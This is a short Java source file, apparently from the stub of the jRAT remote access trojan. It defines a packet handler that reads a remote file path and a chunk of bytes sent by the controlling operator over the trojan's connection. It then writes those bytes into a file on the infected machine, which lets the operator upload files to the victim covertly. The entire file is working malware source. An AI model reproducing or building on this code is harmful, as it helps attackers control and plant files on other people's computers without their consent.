package se.jrat.stub.packets.incoming;

import se.jrat.common.io.FileCache;
import se.jrat.common.io.TransferData;
import se.jrat.stub.Connection;

public class Packet104ClientDownloadPart extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		final String remotePath = Connection.instance.readLine();

		TransferData localData = FileCache.get(remotePath);
		
		byte[] buffer = new byte[Connection.instance.readInt()];
		Connection.instance.getDataInputStream().readFully(buffer);

		localData.getOutputStream().write(buffer);
		localData.increaseRead(buffer.length);
	}

}
